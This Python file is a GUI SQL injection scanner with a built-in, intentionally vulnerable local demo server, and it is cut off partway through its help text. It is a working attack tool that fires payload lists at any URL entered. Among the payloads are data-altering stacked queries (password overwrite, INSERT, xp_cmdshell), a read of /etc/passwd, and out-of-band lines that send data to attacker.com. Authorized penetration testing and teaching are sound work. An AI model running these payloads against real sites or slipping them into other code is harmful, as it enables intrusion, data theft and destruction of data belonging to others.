#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║         SQLi Scanner Pro — Advanced Edition                  ║
║         Includes built-in vulnerable demo server             ║
║         For Educational / Authorized Testing Only            ║
╚══════════════════════════════════════════════════════════════╝
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading, time, re, urllib.request, urllib.parse, urllib.error
import json, datetime, os, queue, http.server, socketserver, html
from typing import List, Dict, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ── Colors ────────────────────────────────────────────────────
BG_DEEP   = "#0A0E1A"
BG_PANEL  = "#0F1525"
BG_CARD   = "#141B2D"
BG_HOVER  = "#1A2238"
ACCENT    = "#00FF88"
ACCENT2   = "#00C8FF"
ACCENT3   = "#FF4444"
ACCENT4   = "#FFB800"
ACCENT5   = "#BB86FC"
TEXT_MAIN = "#E2E8F0"
TEXT_DIM  = "#64748B"
TEXT_MUT  = "#334155"
BORDER    = "#1E293B"

DEMO_PORT = 18321   # local demo server port

# ══════════════════════════════════════════════════════════════
#  BUILT-IN VULNERABLE DEMO SERVER  (intentionally insecure)
# ══════════════════════════════════════════════════════════════
DEMO_DB = {
    "users":    [{"id":1,"username":"admin","password":"secret123"},
                 {"id":2,"username":"john","password":"pass456"},
                 {"id":3,"username":"alice","password":"alice789"}],
    "products": [{"id":1,"name":"Widget A","price":9.99},
                 {"id":2,"name":"Widget B","price":19.99}],
}

class VulnerableHandler(http.server.BaseHTTPRequestHandler):
    """Intentionally vulnerable HTTP handler that simulates SQLi flaws."""

    def log_message(self, *a): pass   # suppress server logs

    def do_GET(self):
        parsed = urlparse(self.path)
        qs     = parse_qs(parsed.query)

        body = ""
        if parsed.path == "/user":
            uid = qs.get("id", ["1"])[0]
            body = self._page_user(uid)
        elif parsed.path == "/product":
            pid = qs.get("cat", ["1"])[0]
            body = self._page_product(pid)
        elif parsed.path == "/search":
            q = qs.get("q", [""])[0]
            body = self._page_search(q)
        elif parsed.path == "/login":
            usr = qs.get("username", [""])[0]
            body = self._page_login(usr)
        else:
            body = self._home()

        self.send_response(200)
        self.send_header("Content-Type","text/html")
        self.end_headers()
        self.wfile.write(body.encode())

    # ── vulnerable pages ──────────────────────────────────────
    def _vuln_response(self, param_val: str, table_hint: str) -> str:
        sqli_chars = ["'", '"', "--", "#", ";", "/*", "*/",
                      "OR ", "AND ", "UNION", "SELECT", "SLEEP",
                      "WAITFOR", "EXTRACTVALUE", "CONVERT("]
        is_injected = any(c.upper() in param_val.upper() for c in sqli_chars)

        if not is_injected:
            return ""

        errors = [
            f"You have an error in your SQL syntax; check the manual that corresponds "
            f"to your MySQL server version for the right syntax to use near "
            f"'{html.escape(param_val[:30])}' at line 1",
            f"Warning: mysql_fetch_array() expects parameter 1 to be resource, "
            f"boolean given in /var/www/html/{table_hint}.php on line 42",
            f"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an "
            f"error in your SQL syntax near '{html.escape(param_val[:20])}'",
        ]
        import random
        err = random.choice(errors)

        if "UNION" in param_val.upper() and "SELECT" in param_val.upper():
            leaked = json.dumps(DEMO_DB.get("users", []), indent=2)
            return f'<div class="sqlerror">{err}</div><pre>{leaked}</pre>'

        return f'<div class="sqlerror">{err}</div>'

    def _page_user(self, uid):
        vuln = self._vuln_response(uid, "users")
        user = next((u for u in DEMO_DB["users"] if str(u["id"]) == uid), None)
        content = f"<h2>User Profile</h2><p>ID: {uid}</p>"
        if user:
            content += f"<p>Username: {user['username']}</p>"
        content += vuln
        return self._wrap(content, "User Lookup")

    def _page_product(self, cat):
        vuln = self._vuln_response(cat, "products")
        content = f"<h2>Products</h2><p>Category: {cat}</p>"
        for p in DEMO_DB["products"]:
            content += f"<p>{p['name']} — ${p['price']}</p>"
        content += vuln
        return self._wrap(content, "Products")

    def _page_search(self, q):
        vuln = self._vuln_response(q, "search")
        content = f"<h2>Search Results for: {html.escape(q)}</h2>"
        content += vuln
        return self._wrap(content, "Search")

    def _page_login(self, usr):
        vuln = self._vuln_response(usr, "login")
        content = f"<h2>Login</h2><p>Username: {html.escape(usr)}</p>"
        content += vuln
        return self._wrap(content, "Login")

    def _home(self):
        links = [
            ("/user?id=1",            "User Lookup   (?id=)"),
            ("/product?cat=1",        "Products      (?cat=)"),
            ("/search?q=test",        "Search        (?q=)"),
            ("/login?username=admin", "Login         (?username=)"),
        ]
        content = "<h2>SQLi Demo Server</h2><ul>"
        for path, label in links:
            content += f'<li><a href="{path}">{label}</a></li>'
        content += "</ul><p style='color:#888'>Intentionally vulnerable for testing.</p>"
        return self._wrap(content, "Home")

    def _wrap(self, body, title):
        return f"""<!DOCTYPE html><html><head><title>{title}</title>
<style>
  body{{background:#0d1117;color:#e6edf3;font-family:monospace;padding:20px}}
  h2{{color:#58a6ff}} a{{color:#58a6ff}}
  .sqlerror{{background:#2d1b1b;border:1px solid #f85149;color:#f85149;
             padding:10px;margin:10px 0;font-family:monospace;font-size:12px;
             white-space:pre-wrap;border-radius:4px}}
  pre{{background:#161b22;padding:10px;border-radius:4px;color:#7ee787}}
</style></head><body>{body}</body></html>"""


def start_demo_server():
    try:
        server = socketserver.TCPServer(("127.0.0.1", DEMO_PORT), VulnerableHandler)
        server.allow_reuse_address = True
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        return True
    except Exception:
        return False


# ══════════════════════════════════════════════════════════════
#  PAYLOADS
# ══════════════════════════════════════════════════════════════
PAYLOADS = {
    "Error-Based": [
        "'", '"', "''", "');", '";',
        "' OR '1'='1", '" OR "1"="1',
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
        "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "1 AND (SELECT 2 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
    ],
    "Boolean-Based": [
        "' AND '1'='1", "' AND '1'='2",
        "' AND 1=1--", "' AND 1=2--",
        "1 AND 1=1", "1 AND 1=2",
        "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "1' AND (SELECT 'x' FROM users LIMIT 1)='x'--",
    ],
    "Time-Based": [
        "'; WAITFOR DELAY '0:0:2'--",
        "' AND SLEEP(2)--", "' AND SLEEP(5)--",
        "1; SELECT SLEEP(2)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
        "' OR SLEEP(2)--",
        "1 AND SLEEP(2)=0 LIMIT 1--",
        "'; SELECT pg_sleep(2)--",
    ],
    "Union-Based": [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT username,password FROM users--",
        "1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT 1,@@version,3--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
    ],
    "Stacked Queries": [
        "'; INSERT INTO users VALUES('hacked','hacked')--",
        "'; UPDATE users SET password='hacked' WHERE '1'='1'--",
        "1; EXEC xp_cmdshell('dir')--",
        "'; EXEC sp_configure 'show advanced options',1--",
    ],
    "Out-of-Band": [
        "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--",
        "'; EXEC master..xp_dirtree '//attacker.com/a'--",
    ],
}

ERROR_SIGNATURES = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"supplied argument is not a valid mysql",
    r"valid mysql result",
    r"mysqlclient\.",
    r"unclosed quotation mark",
    r"incorrect syntax near",
    r"microsoft.*sql.*server",
    r"odbc.*sql server",
    r"ole db.*sql server",
    r"sqlstate\[",
    r"mssql_query\(\)",
    r"pg_query\(\)",
    r"warning.*pg_",
    r"valid postgresql",
    r"npgsql\.",
    r"unterminated quoted string",
    r"ora-\d{4,5}",
    r"oracle.*error",
    r"warning.*oci_",
    r"sqlite.*error",
    r"sqlite3\.operationalerror",
    r"syntax error.*sqlite",
    r"sql syntax",
    r"sql error",
    r"sql command",
    r"database error",
    r"db error",
    r"invalid query",
    r"sqlexception",
    r"syntax error.*line \d",
    r"quoted string not properly terminated",
    r"sql.*exception",
    r"near.*syntax error",
    r"unexpected end of sql",
]


# ══════════════════════════════════════════════════════════════
#  SCANNER ENGINE
# ══════════════════════════════════════════════════════════════
class ScannerEngine:
    def __init__(self):
        self.custom_headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.9",
        }

    def fetch(self, url: str, timeout: int = 12) -> Tuple[str, int, float]:
        t0 = time.time()
        try:
            req = urllib.request.Request(url, headers=self.custom_headers)
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read().decode("utf-8", errors="ignore")
                return body, r.getcode(), time.time() - t0
        except urllib.error.HTTPError as e:
            try: body = e.read().decode("utf-8", errors="ignore")
            except: body = str(e)
            return body, e.code, time.time() - t0
        except Exception as e:
            return str(e), 0, time.time() - t0

    def inject(self, url: str, param: str, payload: str) -> str:
        p = urlparse(url)
        qs = dict(urllib.parse.parse_qsl(p.query))
        qs[param] = payload
        return urlunparse(p._replace(query=urlencode(qs)))

    def check_errors(self, body: str) -> str:
        low = body.lower()
        for sig in ERROR_SIGNATURES:
            m = re.search(sig, low)
            if m:
                start = max(0, m.start() - 20)
                end   = min(len(low), m.end() + 60)
                snippet = body[start:end].strip().replace("\n"," ")[:100]
                return snippet
        return ""

    def scan_param(self, url, param, cats, baseline_body, baseline_time,
                   callback, stop_evt, delay, timeout):
        for cat in cats:
            if stop_evt.is_set(): break
            for payload in PAYLOADS.get(cat, []):
                if stop_evt.is_set(): break

                inj_url = self.inject(url, param, payload)
                body, status, elapsed = self.fetch(inj_url, timeout)

                vuln_type   = None
                confidence  = 0
                details     = ""

                snippet = self.check_errors(body)
                if snippet:
                    vuln_type  = "Error-Based SQLi"
                    confidence = 92
                    details    = f'DB error: "{snippet}"'
                elif cat == "Time-Based" and elapsed > (baseline_time + 1.5):
                    vuln_type  = "Time-Based Blind SQLi"
                    confidence = 78
                    details    = (f"Response took {elapsed:.2f}s "
                                  f"(baseline {baseline_time:.2f}s)")
                elif cat == "Boolean-Based":
                    diff = abs(len(body) - len(baseline_body))
                    if diff > 80:
                        vuln_type  = "Boolean-Based Blind SQLi"
                        confidence = 65
                        details    = f"Content length diff: {diff} bytes"
                elif cat == "Union-Based":
                    union_hits = re.findall(
                        r"(root:|admin|username|password|information_schema|@@version|\d+\.\d+\.\d+-\w+)",
                        body, re.I)
                    if union_hits:
                        vuln_type  = "Union-Based SQLi (Data Leak)"
                        confidence = 88
                        details    = f"Leaked data: {', '.join(set(union_hits[:4]))}"

                result = dict(param=param, payload=payload, category=cat,
                              status=status, elapsed=elapsed,
                              vulnerable=vuln_type is not None,
                              vuln_type=vuln_type, confidence=confidence,
                              details=details, url=inj_url, body_len=len(body))
                callback(result)
                if delay > 0:
                    time.sleep(delay)


# ══════════════════════════════════════════════════════════════
#  MAIN APP
# ══════════════════════════════════════════════════════════════
class App:
    def __init__(self, root):
        self.root        = root
        self.engine      = ScannerEngine()
        self.stop_evt    = threading.Event()
        self.q: queue.Queue = queue.Queue()
        self.findings: List[Dict] = []
        self.total = self.done = self.n_vulns = 0
        self.demo_running = False
        self._setup_window()
        self._build_ui()
        self._drain_loop()
        self._start_demo_server()

    def _setup_window(self):
        self.root.title("SQLi Scanner Pro — Advanced SQL Injection Testing Suite")
        self.root.geometry("1300x880")
        self.root.minsize(1100, 720)
        self.root.configure(bg=BG_DEEP)
        self.root.update_idletasks()
        sw, sh = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
        self.root.geometry(f"1300x880+{(sw-1300)//2}+{(sh-880)//2}")

        s = ttk.Style(); s.theme_use("clam")
        s.configure(".", background=BG_DEEP, foreground=TEXT_MAIN,
                    fieldbackground=BG_CARD, troughcolor=BG_PANEL, bordercolor=BORDER)
        s.configure("TNotebook", background=BG_DEEP, borderwidth=0)
        s.configure("TNotebook.Tab", background=BG_CARD, foreground=TEXT_DIM,
                    padding=[16,8], font=("Courier New",10,"bold"))
        s.map("TNotebook.Tab", background=[("selected",BG_PANEL)],
              foreground=[("selected",ACCENT)])
        s.configure("TProgressbar", troughcolor=BG_CARD, background=ACCENT, thickness=6)
        s.configure("Treeview", background=BG_CARD, foreground=TEXT_MAIN,
                    fieldbackground=BG_CARD, rowheight=28, font=("Courier New",9))
        s.configure("Treeview.Heading", background=BG_PANEL,
                    foreground=ACCENT2, font=("Courier New",9,"bold"))
        s.map("Treeview", background=[("selected",BG_HOVER)],
              foreground=[("selected",ACCENT)])

    def _start_demo_server(self):
        ok = start_demo_server()
        self.demo_running = ok
        if ok:
            self._log("info", f"  Demo Server started → http://127.0.0.1:{DEMO_PORT}\n")
            self._log("info",  "  Click any DEMO button on the left to auto-load a vulnerable URL\n\n")
        else:
            self._log("warn", f"  Demo server could not start (port {DEMO_PORT} busy?)\n\n")

    def _build_ui(self):
        self._build_banner()
        paned = tk.PanedWindow(self.root, orient="horizontal",
                               bg=BG_DEEP, sashwidth=4, sashpad=2)
        paned.pack(fill="both", expand=True, padx=8, pady=6)
        left  = tk.Frame(paned, bg=BG_PANEL, width=370)
        right = tk.Frame(paned, bg=BG_DEEP)
        paned.add(left,  minsize=330)
        paned.add(right, minsize=600)
        self._build_left(left)
        self._build_right(right)
        self._build_statusbar()

    def _build_banner(self):
        ban = tk.Frame(self.root, bg=BG_PANEL, height=74)
        ban.pack(fill="x"); ban.pack_propagate(False)
        tk.Frame(ban, bg=ACCENT, height=2).pack(fill="x", side="bottom")
        inner = tk.Frame(ban, bg=BG_PANEL); inner.pack(fill="both",expand=True,padx=20)

        lf = tk.Frame(inner, bg=BG_PANEL); lf.pack(side="left", fill="y")
        tk.Label(lf, text="[SQLi]", font=("Courier New",20,"bold"),
                 bg=BG_PANEL, fg=ACCENT).pack(side="left", padx=(0,10))
        tf = tk.Frame(lf, bg=BG_PANEL); tf.pack(side="left")
        tk.Label(tf, text="SQLi Scanner Pro", font=("Courier New",18,"bold"),
                 bg=BG_PANEL, fg=TEXT_MAIN).pack(anchor="w")
        tk.Label(tf, text="Advanced SQL Injection Testing Suite  —  Built-in Demo Server Included",
                 font=("Courier New",8), bg=BG_PANEL, fg=TEXT_DIM).pack(anchor="w")

        sf = tk.Frame(inner, bg=BG_PANEL); sf.pack(side="right", fill="y")
        self.sv_total  = tk.StringVar(value="0")
        self.sv_done   = tk.StringVar(value="0")
        self.sv_vulns  = tk.StringVar(value="0")
        self.sv_status = tk.StringVar(value="IDLE")
        for lbl,var,col in [("TOTAL TESTS",self.sv_total,TEXT_MAIN),
                             ("COMPLETED",  self.sv_done, ACCENT2),
                             ("VULNS FOUND",self.sv_vulns,ACCENT3),
                             ("STATUS",     self.sv_status,ACCENT)]:
            f = tk.Frame(sf, bg=BG_CARD, padx=14, pady=8); f.pack(side="left",padx=4)
            tk.Label(f, textvariable=var, font=("Courier New",16,"bold"),
                     bg=BG_CARD, fg=col).pack()
            tk.Label(f, text=lbl, font=("Courier New",7), bg=BG_CARD, fg=TEXT_DIM).pack()

    def _build_left(self, parent):
        can = tk.Canvas(parent, bg=BG_PANEL, highlightthickness=0)
        sb  = ttk.Scrollbar(parent, orient="vertical", command=can.yview)
        can.configure(yscrollcommand=sb.set)
        sb.pack(side="right", fill="y"); can.pack(fill="both", expand=True)
        frm = tk.Frame(can, bg=BG_PANEL)
        wid = can.create_window((0,0), window=frm, anchor="nw")
        can.bind("<Configure>", lambda e: can.itemconfig(wid, width=e.width))
        frm.bind("<Configure>", lambda e: can.configure(scrollregion=can.bbox("all")))

        self._sec(frm,"[*]","TARGET CONFIGURATION")
        self._build_target(frm)
        self._sec(frm,"[!]","DEMO — VULNERABLE TARGETS (LOCAL SERVER)")
        self._build_demo_buttons(frm)
        self._sec(frm,"[+]","DETECTED PARAMETERS")
        self._build_params(frm)
        self._sec(frm,"[~]","INJECTION CATEGORIES")
        self._build_cats(frm)
        self._sec(frm,"[%]","SCAN OPTIONS")
        self._build_options(frm)
        self._sec(frm,"[>]","ACTIONS")
        self._build_actions(frm)

    def _sec(self, p, icon, title):
        f = tk.Frame(p, bg=BG_PANEL); f.pack(fill="x", padx=10, pady=(14,3))
        tk.Label(f, text=f"{icon}  {title}", font=("Courier New",9,"bold"),
                 bg=BG_PANEL, fg=ACCENT2).pack(side="left")
        tk.Frame(f, bg=BORDER, height=1).pack(side="left", fill="x", expand=True, padx=(8,0))

    def _build_target(self, p):
        f = tk.Frame(p, bg=BG_PANEL); f.pack(fill="x", padx=14, pady=3)
        tk.Label(f, text="Target URL", font=("Courier New",8), bg=BG_PANEL,
                 fg=TEXT_DIM, width=12, anchor="w").pack(side="left")
        self.url_var = tk.StringVar(value=f"http://127.0.0.1:{DEMO_PORT}/user?id=1")
        self.url_ent = tk.Entry(f, textvariable=self.url_var, font=("Courier New",9),
                                bg=BG_CARD, fg=ACCENT, insertbackground=ACCENT,
                                relief="flat", bd=0, highlightthickness=1,
                                highlightcolor=ACCENT, highlightbackground=BORDER)
        self.url_ent.pack(side="left", fill="x", expand=True, ipady=5, padx=4)
        bf = tk.Frame(p, bg=BG_PANEL); bf.pack(fill="x", padx=14, pady=4)
        self._btn(bf,"[*] Auto-Detect Params",self._detect_params,ACCENT2,small=True).pack(side="left")
        self._btn(bf,"[+] Manual Param",      self._add_manual,   ACCENT4,small=True).pack(side="left",padx=6)

    def _build_demo_buttons(self, p):
        info = tk.Frame(p, bg=BG_CARD, padx=10, pady=8)
        info.pack(fill="x", padx=14, pady=4)
        tk.Label(info, text="[!] Built-in demo server running on localhost",
                 font=("Courier New",8), bg=BG_CARD, fg=ACCENT).pack(anchor="w")
        tk.Label(info, text="    Click any button below → fills URL → click START SCAN",
                 font=("Courier New",7), bg=BG_CARD, fg=TEXT_DIM).pack(anchor="w")

        demos = [
            (f"http://127.0.0.1:{DEMO_PORT}/user?id=1",           "[>] /user?id=1          ERROR-BASED"),
            (f"http://127.0.0.1:{DEMO_PORT}/product?cat=1",        "[>] /product?cat=1      ERROR-BASED"),
            (f"http://127.0.0.1:{DEMO_PORT}/search?q=hello",       "[>] /search?q=hello     UNION-BASED"),
            (f"http://127.0.0.1:{DEMO_PORT}/login?username=admin",  "[>] /login?username=    BOOLEAN"),
        ]
        for url, label in demos:
            def make_cmd(u):
                def cmd():
                    self.url_var.set(u)
                    self._detect_params()
                    self._log("info", f"  Demo URL loaded: {u}\n")
                return cmd
            b = tk.Button(p, text=label, command=make_cmd(url),
                          font=("Courier New",8), bg=BG_PANEL, fg=ACCENT4,
                          activebackground=BG_HOVER, activeforeground=ACCENT,
                          relief="flat", bd=0, cursor="hand2",
                          highlightthickness=1, highlightbackground=BORDER,
                          anchor="w", padx=12, pady=5)
            b.pack(fill="x", padx=14, pady=1)
            b.bind("<Enter>", lambda e,w=b: w.config(bg=BG_HOVER, fg=ACCENT))
            b.bind("<Leave>", lambda e,w=b: w.config(bg=BG_PANEL, fg=ACCENT4))

    def _build_params(self, p):
        self.param_frame = tk.Frame(p, bg=BG_CARD)
        self.param_frame.pack(fill="x", padx=14, pady=4)
        self.param_rows: List[Tuple] = []
        tk.Label(self.param_frame, text="  (No parameters detected yet)",
                 font=("Courier New",8), bg=BG_CARD, fg=TEXT_DIM).pack(pady=6)

    def _build_cats(self, p):
        self.cat_vars: Dict[str,tk.BooleanVar] = {}
        colors = [ACCENT, ACCENT2, ACCENT4, ACCENT3, ACCENT5, "#FF6B9D"]
        for i,(cat,pls) in enumerate(PAYLOADS.items()):
            var = tk.BooleanVar(value=(i < 4))
            self.cat_vars[cat] = var
            f = tk.Frame(p, bg=BG_PANEL); f.pack(fill="x", padx=14, pady=1)
            tk.Checkbutton(f, text=cat, variable=var, font=("Courier New",9),
                           bg=BG_PANEL, fg=colors[i%len(colors)],
                           activebackground=BG_PANEL, selectcolor=BG_CARD,
                           relief="flat", highlightthickness=0).pack(side="left")
            tk.Label(f, text=f"[{len(pls)} payloads]",
                     font=("Courier New",7), bg=BG_PANEL, fg=TEXT_MUT).pack(side="right")

    def _build_options(self, p):
        self.timeout_var = tk.IntVar(value=10)
        self.delay_var   = tk.DoubleVar(value=0.05)
        self.follow_var  = tk.BooleanVar(value=True)

        def slider(lbl, var, lo, hi, fmt):
            f = tk.Frame(p, bg=BG_PANEL); f.pack(fill="x", padx=14, pady=3)
            tk.Label(f, text=lbl, font=("Courier New",8),
                     bg=BG_PANEL, fg=TEXT_DIM, width=14, anchor="w").pack(side="left")
            dv = tk.Label(f, font=("Courier New",8,"bold"), bg=BG_PANEL, fg=ACCENT, width=6)
            dv.pack(side="right")
            def upd(v): dv.config(text=fmt.format(float(v)))
            ttk.Scale(f, from_=lo, to=hi, variable=var, orient="horizontal",
                      command=upd).pack(side="left", fill="x", expand=True, padx=4)
            upd(var.get())

        slider("Timeout (s)",   self.timeout_var, 3, 30, "{:.0f}s")
        slider("Req Delay (s)", self.delay_var,   0,  2, "{:.2f}s")
        f = tk.Frame(p, bg=BG_PANEL); f.pack(fill="x", padx=14, pady=3)
        tk.Checkbutton(f, text=" Follow Redirects", variable=self.follow_var,
                       font=("Courier New",9), bg=BG_PANEL, fg=TEXT_MAIN,
                       activebackground=BG_PANEL, selectcolor=BG_CARD,
                       relief="flat").pack(side="left")

    def _build_actions(self, p):
        tk.Frame(p, bg=BORDER, height=1).pack(fill="x", padx=14, pady=8)
        self.scan_btn = self._btn(p,"[>] START SCAN",self._start_scan,ACCENT, large=True)
        self.scan_btn.pack(fill="x", padx=14, pady=2)
        self.stop_btn = self._btn(p,"[x] STOP SCAN", self._stop_scan, ACCENT3,large=True)
        self.stop_btn.pack(fill="x", padx=14, pady=2)
        self.stop_btn.config(state="disabled")
        r = tk.Frame(p, bg=BG_PANEL); r.pack(fill="x", padx=14, pady=4)
        self._btn(r,"Export JSON",self._export, ACCENT4,small=True).pack(side="left",fill="x",expand=True,padx=(0,4))
        self._btn(r,"Clear",      self._clear,  TEXT_DIM,small=True).pack(side="left",fill="x",expand=True)

    def _btn(self, parent, text, cmd, color, large=False, small=False):
        sz = 11 if large else (8 if small else 9)
        b = tk.Button(parent, text=text, command=cmd,
                      font=("Courier New",sz,"bold"),
                      bg=BG_CARD, fg=color,
                      activebackground=BG_HOVER, activeforeground=color,
                      relief="flat", bd=0, cursor="hand2",
                      highlightthickness=1, highlightcolor=color,
                      highlightbackground=BORDER,
                      padx=10, pady=8 if large else 4)
        b.bind("<Enter>", lambda e: b.config(bg=BG_HOVER))
        b.bind("<Leave>", lambda e: b.config(bg=BG_CARD))
        return b

    def _build_right(self, parent):
        nb = ttk.Notebook(parent)
        nb.pack(fill="both", expand=True, padx=4, pady=4)
        t1 = tk.Frame(nb, bg=BG_DEEP)
        t2 = tk.Frame(nb, bg=BG_DEEP)
        t3 = tk.Frame(nb, bg=BG_DEEP)
        t4 = tk.Frame(nb, bg=BG_DEEP)
        nb.add(t1, text="  LIVE LOG  ")
        nb.add(t2, text="  FINDINGS  ")
        nb.add(t3, text="  ANALYSIS  ")
        nb.add(t4, text="  HELP  ")
        self._build_log_tab(t1)
        self._build_findings_tab(t2)
        self._build_analysis_tab(t3)
        self._build_help_tab(t4)
        self.nb = nb

    def _build_log_tab(self, p):
        tf = tk.Frame(p, bg=BG_PANEL); tf.pack(fill="x", padx=6, pady=4)
        tk.Label(tf, text="LIVE SCAN LOG", font=("Courier New",10,"bold"),
                 bg=BG_PANEL, fg=ACCENT).pack(side="left", padx=8)
        self.pct_lbl = tk.Label(tf, text="0%", font=("Courier New",9),
                                 bg=BG_PANEL, fg=ACCENT2)
        self.pct_lbl.pack(side="right")
        self.prog_var = tk.DoubleVar(value=0)
        ttk.Progressbar(tf, variable=self.prog_var, maximum=100,
                        style="TProgressbar", length=200).pack(side="right", padx=8)

        self.log = scrolledtext.ScrolledText(
            p, font=("Courier New",9), bg=BG_DEEP, fg=TEXT_MAIN,
            insertbackground=ACCENT, relief="flat", padx=12, pady=8,
            spacing1=2, spacing3=2, highlightthickness=0, state="disabled")
        self.log.pack(fill="both", expand=True, padx=6, pady=(0,6))
        for tag,col,bold in [("vuln",ACCENT3,True),("safe",TEXT_MUT,False),
                              ("info",ACCENT2,False),("warn",ACCENT4,False),
                              ("hdr",ACCENT,True),("time",TEXT_DIM,False),
                              ("pay",ACCENT5,False)]:
            self.log.tag_config(tag, foreground=col,
                                font=("Courier New",9,"bold" if bold else "normal"))
        self._log("hdr","="*68+"\n")
        self._log("hdr","  SQLi Scanner Pro  —  READY\n")
        self._log("hdr","="*68+"\n")

    def _build_findings_tab(self, p):
        tk.Label(p, text="VULNERABILITY FINDINGS", font=("Courier New",10,"bold"),
                 bg=BG_PANEL, fg=ACCENT3).pack(fill="x", padx=6, pady=4)
        cols = ("sev","param","type","conf","payload","details")
        self.tree = ttk.Treeview(p, columns=cols, show="headings", selectmode="extended")
        for col,w,h in zip(cols,[70,90,160,70,200,260],
                            ["SEV","PARAM","VULN TYPE","CONF","PAYLOAD","DETAILS"]):
            self.tree.heading(col, text=h)
            self.tree.column(col, width=w, minwidth=w, anchor="w")
        vsb = ttk.Scrollbar(p, orient="vertical",   command=self.tree.yview)
        hsb = ttk.Scrollbar(p, orient="horizontal", command=self.tree.xview)
        self.tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        hsb.pack(side="bottom", fill="x", padx=6)
        vsb.pack(side="right", fill="y", pady=(0,4))
        self.tree.pack(fill="both", expand=True, padx=(6,0), pady=(0,4))
        self.tree.tag_configure("HIGH",   foreground=ACCENT3)
        self.tree.tag_configure("MEDIUM", foreground=ACCENT4)
        self.tree.tag_configure("LOW",    foreground=ACCENT2)
        dk = tk.Frame(p, bg=BG_CARD, height=110); dk.pack(fill="x", padx=6, pady=(0,6))
        dk.pack_propagate(False)
        self.det = tk.Text(dk, font=("Courier New",8), bg=BG_CARD, fg=TEXT_MAIN,
                           relief="flat", padx=8, pady=6, highlightthickness=0,
                           state="disabled")
        self.det.pack(fill="both", expand=True)
        self.tree.bind("<<TreeviewSelect>>", self._tree_sel)

    def _build_analysis_tab(self, p):
        cf = tk.Frame(p, bg=BG_DEEP); cf.pack(fill="x", padx=8, pady=8)
        self.cv: Dict[str,tk.StringVar] = {}
        for key,lbl,init,col in [
            ("tests", "TOTAL TESTS",   "0", ACCENT2),("vulns","VULNERABILITIES","0",ACCENT3),
            ("high",  "HIGH RISK",     "0", ACCENT3),("medium","MEDIUM RISK",   "0",ACCENT4),
            ("params","PARAMS HIT",    "0", ACCENT), ("time",  "SCAN DURATION", "0s",TEXT_MAIN),
        ]:
            var = tk.StringVar(value=init); self.cv[key] = var
            f = tk.Frame(cf, bg=BG_CARD, padx=14, pady=10)
            f.pack(side="left", fill="y", padx=4, expand=True)
            tk.Label(f, textvariable=var, font=("Courier New",18,"bold"),
                     bg=BG_CARD, fg=col).pack()
            tk.Label(f, text=lbl, font=("Courier New",7),
                     bg=BG_CARD, fg=TEXT_DIM).pack()
        tk.Frame(p, bg=BORDER, height=1).pack(fill="x", padx=8, pady=4)
        self.ana = scrolledtext.ScrolledText(p, font=("Courier New",9), bg=BG_DEEP,
                                             fg=TEXT_MAIN, insertbackground=ACCENT,
                                             relief="flat", padx=12, pady=8,
                                             highlightthickness=0, state="disabled")
        self.ana.pack(fill="both", expand=True, padx=8, pady=(0,8))
        for tag,col,bold in [("h1",ACCENT,True),("h2",ACCENT2,True),
                              ("red",ACCENT3,False),("amb",ACCENT4,False),
                              ("dim",TEXT_DIM,False)]:
            self.ana.tag_config(tag, foreground=col,
                                font=("Courier New",10 if bold else 9,
                                      "bold" if bold else "normal"))
        self.ana.config(state="normal")
        self.ana.insert("end","  Run a scan to see analysis results.\n","dim")
        self.ana.config(state="disabled")

    def _build_help_tab(self, p):
        t = scrolledtext.ScrolledText(p, font=("Courier New",9), bg=BG_DEEP, fg=TEXT_MAIN,
                                      insertbackground=ACCENT, relief="flat",
                                      padx=20, pady=16, highlightthickness=0)
        t.pack(fill="both", expand=True, padx=6, pady=6)
        for tag,col,sz in [("h1",ACCENT,13),("h2",ACCENT2,10),
                            ("ok",ACCENT,9),("warn",ACCENT4,9),("dim",TEXT_DIM,9)]:
            t.tag_config(tag, foreground=col,
                         font=("Courier New",sz,"bold" if sz>9 else "normal"))
        lines = [
            ("h1","SQLi Scanner Pro — Complete Guide\n\n"),
            ("h2","QUICKEST WAY TO SEE A VULNERABILITY (30 seconds)\n"),
            ("ok","  1. App starts → demo server launches automatically on port 18321\n"),
            ("ok","  2. Click any [>] button in the DEMO section on the left panel\n"),
            ("ok","  3. The URL auto-fills with a vulnerable local endpoint\n"),
            ("ok","  4. Click [>] START SCAN\n"),
            ("ok","  5. Watch red VULNERABLE lines appear in the Live Log!\n\n"),
            ("h2","EXTERNAL VULNERABLE SITES (internet required)\n"),
            ("dim","  http://testphp.vulnweb.com/artists.php?artist=1\n"),
            ("dim","  http://testphp.vulnweb.com/listproducts.php?cat=1\n"),
